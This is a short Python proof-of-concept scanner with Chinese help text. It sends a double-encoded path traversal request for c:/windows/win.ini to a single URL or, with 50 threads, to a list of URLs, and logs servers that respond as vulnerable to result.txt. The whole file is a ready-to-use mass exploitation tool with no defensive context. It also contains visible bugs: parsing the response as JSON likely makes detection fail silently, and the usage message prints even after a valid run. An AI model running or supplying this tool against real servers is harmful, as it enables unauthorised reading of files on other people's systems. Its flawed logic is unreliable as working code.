import requests,sys,argparse,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def bb():
    tt="""┏┓            ┏┓    ┓   •    ┏┓┓     ┓  ┏•┓         ┓
┗┓┏┓┏┓┓┏┏┓┓┏━━┣┫┏┓┏┓┃┓┏╋┓┏┏━━┃ ┃┏┓┓┏┏┫━━╋┓┃┏┓┏┓┏┓┏┓┏┫
┗┛┗ ┗ ┗┫┗┛┗┻  ┛┗┛┗┗┻┗┗┫┗┗┗┛  ┗┛┗┗┛┗┻┗┻  ┛┗┗┗ ┛ ┗ ┗┻┗┻
       ┛              ┛                              
"""
    print(tt)

def main():
    bb()
    parser=argparse.ArgumentParser(description="脚本脚本")
    parser.add_argument('-u','--url',dest='url',type=str,help='输入URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='导入文件')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8')as f1:
            for i in f1.readlines():
                url_list.append(i.strip())
        mp =Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload='/.%252e/.%252e/c:/windows/win.ini'
    try:
        req1=requests.get(url=target+payload)
        req=json.loads(req1.text)
        if req1.status_code==200 and "fonts" in req1.text :
            print(f"[+++]{target}")
            with open('result.txt',mode='a')as f2:
                f2.write(target+'\n')
        else:
            print(f'[-]{target}')
    except:
        pass
    
if __name__ == '__main__':
    main()
